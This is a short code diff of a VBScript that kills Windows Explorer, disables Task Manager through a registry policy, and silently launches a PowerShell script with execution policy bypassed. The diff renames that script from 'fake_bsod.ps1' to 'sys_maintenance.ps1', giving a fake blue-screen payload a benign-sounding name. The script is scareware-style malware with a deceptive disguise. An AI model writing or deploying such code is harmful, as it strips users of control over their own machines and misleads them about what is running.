@@ -14,7 +14,7 @@ objShell.Run "taskkill /F /IM explorer.exe", 0, True
 objShell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", 0, True
 
 ' Launch the fake BSOD
-objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %USERPROFILE%\fake_bsod.ps1", 0, True
+objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %USERPROFILE%\sys_maintenance.ps1", 0, True
 
 ' Clean up
 Set objShell = Nothing
